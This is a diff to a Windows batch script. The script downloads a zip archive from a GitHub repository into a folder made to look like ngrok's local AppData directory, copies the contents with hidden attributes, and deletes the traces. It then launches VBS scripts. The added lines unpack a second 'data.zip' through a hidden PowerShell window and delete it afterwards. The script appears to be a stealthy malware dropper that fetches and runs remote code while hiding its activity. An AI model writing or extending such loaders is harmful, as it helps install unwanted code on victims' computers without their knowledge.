@@ -6,6 +6,7 @@ set "NGROK_DIR=C:\Users\%USER%\AppData\Local\ngrok"
 set "REPO_URL=https://github.com/ofutpemata22/mamf/archive/refs/heads/main.zip"
 set "ZIP_PATH=%NGROK_DIR%\mamf.zip"
 set "TEMP_FILE=%TEMP%\8b37b206-42e3-4bdf-9344-aa7matagrasa77be014.tmp"
+set "DATA_ZIP=%NGROK_DIR%\data.zip"
 
 if not exist "%NGROK_DIR%" mkdir "%NGROK_DIR%"
 
@@ -15,9 +16,15 @@ xcopy "%NGROK_DIR%\__repo__\mamf-main\*" "%NGROK_DIR%\" /s /e /h /y
 del "%ZIP_PATH%"
 rmdir /S /Q "%NGROK_DIR%\__repo__"
 
+if exist "%DATA_ZIP%" (
+    powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%DATA_ZIP%' -DestinationPath '%NGROK_DIR%\__extracted__'"
+    xcopy "%NGROK_DIR%\__extracted__\*" "%NGROK_DIR%\" /s /e /h /y
+    rmdir /S /Q "%NGROK_DIR%\__extracted__"
+    del "%DATA_ZIP%"
+)
+
 start "" "%NGROK_DIR%\nt.vbs"
 
-:WAIT_FILE
 timeout /t 2 >nul
 if exist "%TEMP_FILE%" (
     start "" "%NGROK_DIR%\main.vbs"
